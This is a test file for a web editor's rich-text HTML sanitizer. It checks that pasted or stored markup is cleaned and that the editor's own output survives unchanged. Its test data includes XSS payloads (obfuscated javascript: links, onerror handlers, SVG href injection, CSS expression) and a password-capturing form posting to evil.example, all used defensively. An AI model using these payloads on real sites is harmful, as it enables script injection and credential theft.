/**
 * The rich-text allowlist (RICH_TEXT and buildRich in sanitize.js), the one cleaner the drawing of a text and a paste into one share, run on the audit's hostile samples and on what the editor writes.
 * The editor reads a rich-text title's words in an inert document too (state/collections.svelte.js plainTitle), checked from its source.
 * Node has no HTML parser, so a small one stands in for the browser's here: it decodes character references, keeps an SVG's elements in the SVG namespace with their own case, and reads script, style and textarea as raw text, as the browser's parser does.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { engineImport, ENGINE_DIR } from './_engine.mjs';

const { buildRich, richStyle, RICH_TEXT, setRichHtml, cleanRichHtml, pasteCommand, EDIT_HANDLES } = await engineImport('sanitize.js');

const HTML_NS = 'http://www.w3.org/1999/xhtml';
const SVG_NS = 'http://www.w3.org/2000/svg';
const MATH_NS = 'http://www.w3.org/1998/Math/MathML';

class Node {
  constructor(nodeType) { this.nodeType = nodeType; this.childNodes = []; }
  appendChild(child) {
    if (child.nodeType === 11) { for (const c of [...child.childNodes]) this.appendChild(c); return child; }
    this.childNodes.push(child);
    return child;
  }
  replaceChildren(...nodes) { this.childNodes = []; for (const n of nodes) this.appendChild(n); }
  get textContent() { return this.nodeType === 3 ? this.nodeValue : this.childNodes.map((c) => (c.nodeType === 8 ? '' : c.textContent)).join(''); }
}
class Text extends Node { constructor(value) { super(3); this.nodeValue = value; } }
class Element extends Node {
  constructor(localName, namespaceURI = HTML_NS) { super(1); this.localName = localName; this.namespaceURI = namespaceURI; this.attributes = []; }
  getAttribute(name) { return this.attributes.find((a) => a.name === name)?.value ?? null; }
  hasAttribute(name) { return this.attributes.some((a) => a.name === name); }
  setAttribute(name, value) {
    const found = this.attributes.find((a) => a.name === name);
    if (found) found.value = String(value); else this.attributes.push({ name, value: String(value) });
  }
  get innerHTML() { return this.childNodes.map(serialize).join(''); }
}
const doc = {
  createElement: (tag) => new Element(tag),
  createTextNode: (value) => new Text(value),
  createDocumentFragment: () => new Node(11),
};

const VOID = new Set(['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input', 'link', 'meta', 'source', 'track', 'wbr', 'param']);
const RAW = new Set(['script', 'style', 'textarea', 'title', 'xmp', 'iframe', 'noembed', 'noframes']);
const NAMED = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: ' ', colon: ':', Tab: '\t', NewLine: '\n', lpar: '(', rpar: ')', sol: '/', comma: ',', period: '.', excl: '!', num: '#', equals: '=' };
const decode = (s) => s.replace(/&(#[xX][0-9a-fA-F]+|#\d+|[a-zA-Z]+);?/g, (m, e) => {
  if (e[0] !== '#') return NAMED[e] ?? m;
  const code = /^#x/i.test(e) ? parseInt(e.slice(2), 16) : parseInt(e.slice(1), 10);
  return String.fromCodePoint(code);
});

/** A small HTML parser standing in for the browser's: comments, references, void and raw-text elements, and the SVG and MathML namespaces. */
function parse(html) {
  const body = new Element('body');
  const stack = [body];
  const top = () => stack[stack.length - 1];
  let i = 0;
  const src = String(html);
  while (i < src.length) {
    if (src.startsWith('<!--', i)) { const end = src.indexOf('-->', i + 4); i = end < 0 ? src.length : end + 3; continue; }
    if (src.startsWith('<!', i) || src.startsWith('<?', i)) { const end = src.indexOf('>', i); i = end < 0 ? src.length : end + 1; continue; }
    const close = /^<\/([^\s/>]+)\s*>/.exec(src.slice(i));
    if (close) {
      const name = close[1].toLowerCase();
      const at = stack.findLastIndex((n, k) => k > 0 && n.localName.toLowerCase() === name);
      if (at > 0) stack.length = at;
      i += close[0].length;
      continue;
    }
    const open = /^<([a-zA-Z][^\s/>]*)/.exec(src.slice(i));
    if (open) {
      i += open[0].length;
      const parent = top();
      const raw = open[1];
      const ns = parent.namespaceURI !== HTML_NS ? parent.namespaceURI : raw.toLowerCase() === 'svg' ? SVG_NS : raw.toLowerCase() === 'math' ? MATH_NS : HTML_NS;
      const node = new Element(ns === HTML_NS ? raw.toLowerCase() : raw, ns);
      const attr = /^\s*([^\s"'>/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/;
      let m;
      while ((m = attr.exec(src.slice(i)))) {
        i += m[0].length;
        const name = ns === HTML_NS ? m[1].toLowerCase() : m[1];
        if (!node.hasAttribute(name)) node.attributes.push({ name, value: decode(m[2] ?? m[3] ?? m[4] ?? '') });
      }
      const selfClosing = src.startsWith('/>', i.valueOf()) || /^\s*\/>/.test(src.slice(i));
      i = src.indexOf('>', i) + 1 || src.length;
      parent.appendChild(node);
      if (ns === HTML_NS && RAW.has(node.localName)) {
        const end = src.toLowerCase().indexOf(`</${node.localName}`, i);
        const text = src.slice(i, end < 0 ? src.length : end);
        if (text) node.appendChild(new Text(node.localName === 'textarea' || node.localName === 'title' ? decode(text) : text));
        i = end < 0 ? src.length : src.indexOf('>', end) + 1;
        continue;
      }
      if ((ns === HTML_NS && VOID.has(node.localName)) || (ns !== HTML_NS && selfClosing)) continue;
      stack.push(node);
      continue;
    }
    const next = src.indexOf('<', i + 1);
    const text = src.slice(i, next < 0 ? src.length : next);
    top().appendChild(new Text(decode(text)));
    i = next < 0 ? src.length : next;
  }
  return body;
}

const escapeText = (s) => s.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');
const escapeAttr = (s) => s.replaceAll('&', '&amp;').replaceAll('"', '&quot;');
function serialize(node) {
  if (node.nodeType === 3) return escapeText(node.nodeValue);
  if (node.nodeType === 11) return node.childNodes.map(serialize).join('');
  if (node.nodeType !== 1) return '';
  const attrs = node.attributes.map((a) => ` ${a.name}="${escapeAttr(a.value)}"`).join('');
  if (VOID.has(node.localName)) return `<${node.localName}${attrs}>`;
  return `<${node.localName}${attrs}>${node.childNodes.map(serialize).join('')}</${node.localName}>`;
}

const clean = (html, options) => serialize(buildRich(parse(html), doc, options));

/** The text as stored, its styles' spacing made the cleaner's (`name: value; name: value`), so a comparison sees what was lost and never how it was spaced. */
function asStored(html) {
  const body = parse(html);
  const walk = (node) => {
    for (const child of node.childNodes) {
      if (child.nodeType !== 1) continue;
      const style = child.attributes.find((a) => a.name === 'style');
      if (style) style.value = style.value.split(';').map((d) => d.trim()).filter(Boolean).map((d) => d.replace(/\s*:\s*/, ': ')).join('; ');
      walk(child);
    }
  };
  walk(body);
  return body.innerHTML;
}

test('the stand-in parser reads as the browser does: references decoded, SVG in its own namespace, raw text kept as text', () => {
  const body = parse('<p title="a&quot;b">x &amp; &#106;<br>y</p><svg viewBox="0 0 1 1"><animateMotion/></svg><script>if (a < b) x()</script>');
  assert.equal(body.childNodes[0].getAttribute('title'), 'a"b');
  assert.equal(body.childNodes[0].textContent, 'x & jy');
  assert.equal(body.childNodes[1].namespaceURI, SVG_NS);
  assert.equal(body.childNodes[1].childNodes[0].localName, 'animateMotion');
  assert.equal(body.childNodes[2].textContent, 'if (a < b) x()');
});

test('scripts, event attributes, classes, ids and names go; the words stay', () => {
  assert.equal(clean('<p onclick="x()" ONMOUSEOVER="y()" class="lead" id="intro" name="createElement">Hi<script>alert(1)</script></p>'), '<p>Hi</p>');
  assert.equal(clean('<img name="createElement" id="cookie" src="/media/images/a.webp" onerror="alert(1)">'), '<img src="/media/images/a.webp">');
  assert.equal(clean('<form name="createElement"><p>Words</p></form>'), '<p>Words</p>', 'a form gives way to its words and never names itself onto the document');
});

test('a link keeps only an address that cannot run anything, however the scheme is written', () => {
  for (const href of ['javascript:alert(1)', 'java&#x09;script:alert(1)', 'javascript&colon;alert(1)', '&#106;avascript:alert(1)', ' JaVaScRiPt:alert(1)', 'vbscript:x', 'data:text/html,<script>alert(1)</script>', 'data:image/svg+xml,<svg onload=alert(1)>', '//evil.example/x']) {
    assert.equal(clean(`<a href="${href}">x</a>`), '<a>x</a>', href);
  }
  for (const href of ['https://example.no/side', 'http://example.no', 'mailto:post@example.no', 'tel:+4712345678', '/om-oss', '/om-oss#kontakt', '#kontakt']) {
    assert.equal(clean(`<a href="${href}">x</a>`), `<a href="${href}">x</a>`, href);
  }
});

test('the audit\'s samples come out inert: a form with its fields, a meta refresh, a base, a stylesheet, a style and an SVG with a prefixed script, entities or xlink:href', () => {
  const samples = [
    '<form action="https://evil.example/collect"><input name="password" placeholder="Password"><button formaction="javascript:alert(1)">Log in</button></form>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<base href="https://evil.example/">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    '<style>body { display: none }</style>',
    '<svg><a xlink:href="javascript:alert(1)"><text>press</text></a></svg>',
    '<svg><a href="#"><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="href" to="javascript:alert(1)"/><text>press</text></a></svg>',
    '<svg><s:script xmlns:s="http://www.w3.org/2000/svg">alert(1)</s:script></svg>',
    '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe><object data="x.swf"></object><embed src="x.swf"><template><img src=x onerror=alert(1)></template><noscript><p>x</p></noscript>',
    '<textarea><img src=x onerror=alert(1)></textarea><select><option>a</option></select>',
    '<video poster="javascript:alert(1)"><source src="x.mp4"></video><audio src="x.mp3"></audio><picture><img src="/a.webp"></picture>',
  ];
  for (const sample of samples) assert.equal(clean(sample), '', sample);
});

test('a style keeps the properties a text sets, with plain values, and loses positions, addresses and everything else', () => {
  assert.equal(richStyle('position: fixed; inset: 0; z-index: 99; color: red; background: url(https://evil.example/x.png)'), 'color: red');
  assert.equal(richStyle('color: var(--urd-color-accent); font-family: "Times New Roman", serif; mso-bidi-font-family: Calibri'), 'color: var(--urd-color-accent); font-family: "Times New Roman", serif');
  assert.equal(richStyle('background-color: url(javascript:alert(1)); font-size: expression(alert(1)); color: red !important; margin-left: 40px'), 'margin-left: 40px');
  assert.equal(richStyle('color: \\72 ed; letter-spacing: 1px; text-align: center; line-height: 1.6'), 'letter-spacing: 1px; text-align: center; line-height: 1.6');
  assert.equal(clean('<div style="position:fixed;inset:0;color:red">x</div>'), '<div style="color: red">x</div>');
  assert.equal(clean('<span style="position: absolute">x</span>'), '<span>x</span>', 'an empty style is left out');
});

test('a wrapper outside the allowlist gives way to its words, and a link that opens a new tab never reaches back', () => {
  assert.equal(clean('<section><o:p>a</o:p><custom-el>b</custom-el><center>c</center></section>'), 'abc');
  assert.equal(clean('<a href="https://example.no" target="_blank">x</a>'), '<a href="https://example.no" target="_blank" rel="noopener">x</a>');
  assert.equal(clean('<a href="https://example.no" target="_top" rel="me nofollow opener">x</a>'), '<a href="https://example.no" rel="nofollow">x</a>');
  assert.equal(clean('<a href="https://example.no" target="_blank" rel="noopener nofollow sponsored">x</a>'), '<a href="https://example.no" target="_blank" rel="noopener nofollow sponsored">x</a>');
});

test('a link to a page or a spot on it gets the address the page has now', () => {
  const pages = [{ id: 'kaker', path: '/kaker' }, { id: 'hjem', path: '/' }];
  assert.equal(clean('<a href="/gamle-kaker" data-urd-page="kaker">x</a>', { pages }), '<a href="/kaker" data-urd-page="kaker">x</a>');
  assert.equal(clean('<a href="javascript:x" data-urd-page="kaker" data-urd-target="sec-1">x</a>', { pages }), '<a data-urd-page="kaker" data-urd-target="sec-1" href="/kaker#sec-1">x</a>');
  assert.equal(clean('<a href="/gamle-kaker" data-urd-page="kaker">x</a>'), '<a href="/gamle-kaker" data-urd-page="kaker">x</a>', 'without the register the address stays');
});

test('what the editor writes comes through unchanged', () => {
  const written = [
    '<h2>Overskrift</h2><p style="text-align: center">Midt</p><p><b>fet</b> <i>kursiv</i> <u>under</u> <strike>gjennom</strike> x<sup>2</sup> H<sub>2</sub>O</p>',
    '<ul><li>en</li><li>to</li></ul><ol start="3"><li value="3">tre</li></ol><blockquote><p>sitat</p></blockquote>',
    '<p><a href="/kaker" data-urd-page="kaker" data-urd-target="sec-1">kaker</a> <a href="https://example.no" target="_blank" rel="noopener nofollow">ut</a> <a href="/media/files/meny.pdf" download="">meny</a></p>',
    '<p><font face="Georgia, serif" color="#ff0000">farge</font> <span style="font-size: 22px; letter-spacing: 1px; line-height: 1.6">stor</span> <span style="color: var(--urd-color-accent); background-color: rgb(255, 255, 0)">uthevet</span></p>',
    '<p style="margin-left: 40px">innrykk</p><div>linje<br>to</div><h1>En</h1><h3>Tre</h3>',
    '<p align="center">midt i Firefox</p><div align="right">høyre</div><h2 align="justify">blokk</h2>',
    '<blockquote data-urd-form=""><h3>Angreskjema</h3><p>Til <span data-urd-fill="">[navn]</span></p></blockquote>',
    '<table><tbody><tr><th colspan="2">Hode</th></tr><tr><td>a</td><td rowspan="1">b</td></tr></tbody></table><hr><p><img src="/media/images/a.webp" alt="Et bilde" width="200" height="100"></p>',
  ];
  for (const html of written) assert.equal(clean(html), asStored(html), html);
});

/** Every HTML string in a JSON value, by its path. */
function htmlStrings(value, path, out) {
  if (typeof value === 'string') { if (/<[a-z]/i.test(value)) out.push([path, value]); }
  else if (Array.isArray(value)) value.forEach((v, i) => htmlStrings(v, `${path}[${i}]`, out));
  else if (value && typeof value === 'object') for (const [k, v] of Object.entries(value)) htmlStrings(v, `${path}.${k}`, out);
  return out;
}
const files = (dir) => readdirSync(dir).flatMap((n) => { const p = join(dir, n); return statSync(p).isDirectory() ? files(p) : [p]; });

test('the example site\'s own texts and the shipped presets lose nothing when they are drawn', async () => {
  const found = [];
  for (const file of files(new URL('../template/content/', import.meta.url).pathname).filter((f) => f.endsWith('.json'))) {
    htmlStrings(JSON.parse(readFileSync(file, 'utf8')), file.split('/content/')[1], found);
  }
  const { registerSectionPresets, termsHtml } = await engineImport('sections/presets.js');
  const defs = new Map();
  registerSectionPresets({ sections: { define: (id, def) => defs.set(id, def) } });
  for (const [id, def] of defs) htmlStrings(def.create(), `preset ${id}`, found);
  htmlStrings(termsHtml(), 'termsHtml', found);
  assert.ok(found.length > 50, `found ${found.length} texts`);
  for (const [path, html] of found) assert.equal(clean(html), asStored(html), path);
});

test('a paste keeps the words\' structure and marks, and leaves the source\'s fonts, sizes and colours to the theme', () => {
  const docs = '<meta charset="utf-8"><b style="font-weight:normal;" id="docs-internal-guid-1"><h2 dir="ltr" style="line-height:1.38;margin-top:18pt"><span style="font-size:16pt;font-family:Arial,sans-serif;color:#000000;background-color:transparent;font-weight:400">Overskrift</span></h2><p dir="ltr" style="line-height:1.38;text-align:center"><span style="font-size:11pt;font-family:Arial,sans-serif;color:#000000;font-weight:700;font-style:italic">fet og kursiv</span></p></b>';
  assert.equal(clean(docs, { pasted: true }), '<b style="font-weight: normal"><h2 dir="ltr"><span style="font-weight: 400">Overskrift</span></h2><p dir="ltr" style="text-align: center"><span style="font-weight: 700; font-style: italic">fet og kursiv</span></p></b>');
  const word = '<p class="MsoNormal" style="margin:0cm;line-height:normal"><span style="font-size:11.0pt;font-family:&quot;Calibri&quot;,sans-serif;color:black">Fra <u>Word</u></span></p>';
  assert.equal(clean(word, { pasted: true }), '<p><span>Fra <u>Word</u></span></p>');
  assert.equal(clean('<font face="Comic Sans" color="#f00">x</font><span style="color: var(--urd-color-accent); font-size: 30px">y</span>', { pasted: true }), '<font>x</font><span style="color: var(--urd-color-accent)">y</span>', 'the theme\'s own colours stay');
  assert.equal(clean(docs).includes('font-family: Arial'), true, 'a drawn text keeps what it stored');
});

test('pasteCommand: a rich field takes cleaned HTML, Ctrl+Shift+V the words, and a plain field or a paste without HTML is left to the browser', () => {
  const realParser = globalThis.DOMParser;
  const realDocument = globalThis.document;
  globalThis.DOMParser = class { parseFromString(html) { return { body: parse(html) }; } };
  globalThis.document = doc;
  try {
    assert.deepEqual(pasteCommand('true', false, '<p onclick="x()" style="color:#000">Hei <b>du</b></p><script>x()</script>', 'Hei du'), { command: 'insertHTML', value: '<p>Hei <b>du</b></p>' });
    assert.deepEqual(pasteCommand('true', true, '<p>Hei</p>', 'Hei'), { command: 'insertText', value: 'Hei' });
    assert.deepEqual(pasteCommand('true', false, '<script>x()</script><style>p{}</style>', 'x'), { command: 'insertText', value: 'x' }, 'nothing left of the HTML: its words');
    assert.equal(pasteCommand('true', false, '', 'Hei'), null);
    assert.equal(pasteCommand('plaintext-only', false, '<p>Hei</p>', 'Hei'), null);
    assert.equal(pasteCommand(null, false, '<p>Hei</p>', 'Hei'), null);
    assert.equal(pasteCommand('true', true, '<p>x</p>', ''), null);
  } finally {
    globalThis.DOMParser = realParser;
    globalThis.document = realDocument;
  }
});

test('the deepest nesting keeps its words without rebuilding every level', () => {
  const deep = `${'<div>'.repeat(200)}bunn${'</div>'.repeat(200)}`;
  const out = clean(deep);
  assert.ok(out.includes('bunn'));
  assert.equal(out.match(/<div>/g).length, 64);
});

test('the editing handles an older Urd could leave in a text are left out with what is in them', () => {
  assert.equal(clean('<p>a</p><div class="urd-edit-toolbar"><button>B</button>Bold</div><div class="x urd-edit-resize">r</div>', { dropClasses: EDIT_HANDLES }), '<p>a</p>');
});

test('setRichHtml and cleanRichHtml parse in an inert document and draw only the cleaned tree', () => {
  const realParser = globalThis.DOMParser;
  const realDocument = globalThis.document;
  globalThis.DOMParser = class { parseFromString(html) { return { body: parse(html) }; } };
  globalThis.document = doc;
  try {
    const node = new Element('div');
    node.appendChild(new Text('old'));
    setRichHtml(node, '<p onclick="x()">new <a href="/gammel" data-urd-page="kaker">link</a></p>', [{ id: 'kaker', path: '/kaker' }]);
    assert.equal(node.innerHTML, '<p>new <a href="/kaker" data-urd-page="kaker">link</a></p>');
    assert.equal(cleanRichHtml('<meta charset="utf-8"><!--StartFragment--><p class="MsoNormal" style="mso-line-height-rule: exactly; color: red">Fra Word<o:p></o:p></p><!--EndFragment-->'), '<p>Fra Word</p>');
  } finally {
    globalThis.DOMParser = realParser;
    globalThis.document = realDocument;
  }
});

test('every block that draws rich text goes through the allowlist, and the canvas pastes through it', () => {
  for (const file of ['blocks/text.js', 'blocks/faq.js', 'blocks/collection.js', 'blocks/product.js', 'blocks/calendar.js']) {
    const src = readFileSync(new URL(file, ENGINE_DIR), 'utf8');
    assert.match(src, /setRichHtml\(/, file);
    assert.doesNotMatch(src, /\.innerHTML = (?:props\.html|entry\.|value|own)/, `${file} never draws a stored text unclean`);
  }
  const edit = readFileSync(new URL('preview-edit.js', ENGINE_DIR), 'utf8');
  assert.match(edit, /document\.addEventListener\('paste'[\s\S]{0,400}pasteCommand\(/);
  assert.match(edit, /event\.inputType !== 'insertFromDrop'[\s\S]{0,400}pasteCommand\(/);
  assert.match(edit, /window\.addEventListener\('keyup', \(\) => \{ plainPaste = false; \}, true\);/, 'the plain paste is forgotten as its keys are let go');
  assert.ok(Object.keys(RICH_TEXT.elements).every((tag) => !RICH_TEXT.dropped.includes(tag)), 'no element is both kept and dropped');
});

test('SCHEMA.md lists the allowlist as RICH_TEXT holds it: every element, its attributes, the shared ones, the styles and what is left out', () => {
  const schema = readFileSync(new URL('../docs/SCHEMA.md', import.meta.url), 'utf8');
  const section = schema.slice(schema.indexOf('## Rich text'), schema.indexOf('## Mobile review'));
  const line = (label) => section.split('\n').find((l) => l.startsWith(`- **${label}**`)) ?? '';
  const kept = line('The elements kept');
  const tags = Object.keys(RICH_TEXT.elements);
  for (const tag of tags) {
    const named = /^h[1-6]$/.test(tag) ? kept.includes('`h1`-`h6`') : kept.includes(`\`${tag}\``);
    assert.ok(named, `${tag} is listed`);
    for (const attr of RICH_TEXT.elements[tag]) assert.ok(kept.includes(`\`${attr}\``), `${tag}[${attr}] is listed`);
  }
  const listed = [...kept.matchAll(/`([a-z0-9-]+)`/g)].map((m) => m[1]).filter((w) => !Object.values(RICH_TEXT.elements).flat().includes(w));
  for (const tag of listed) assert.ok(tags.includes(tag) || tag === 'h1' || tag === 'h6', `${tag} in SCHEMA.md is kept by RICH_TEXT`);
  const shared = line('The shared attributes');
  for (const attr of RICH_TEXT.shared) assert.ok(shared.includes(`\`${attr}\``), attr);
  for (const prop of RICH_TEXT.styles) assert.ok(shared.includes(`\`${prop}\``), prop);
  const pasted = line('A paste');
  for (const prop of RICH_TEXT.pasted) assert.ok(pasted.includes(`\`${prop}\``), `pasted ${prop}`);
  const dropped = line('The elements left out with their content');
  assert.deepEqual([...dropped.matchAll(/`([a-z]+)`/g)].map((m) => m[1]), RICH_TEXT.dropped);
});

test('the editor reads the words of a rich-text title in an inert document, never with a pattern over the markup', () => {
  const collections = readFileSync(new URL('../editor/src/state/collections.svelte.js', import.meta.url), 'utf8');
  const plain = collections.split('function plainTitle(html) {')[1].split('\n}\n')[0];
  assert.match(plain, /^\s*const doc = new DOMParser\(\)\.parseFromString\(String\(html \?\? ''\), 'text\/html'\);\s*return \(doc\.body\.textContent \?\? ''\)\.trim\(\);\s*$/);
  assert.match(collections, /plainTitle,/, 'the one the other parts use');
  assert.doesNotMatch(collections, /\.replace\(\/<|innerHTML/, 'no markup is stripped by a pattern or read through a live element');
});
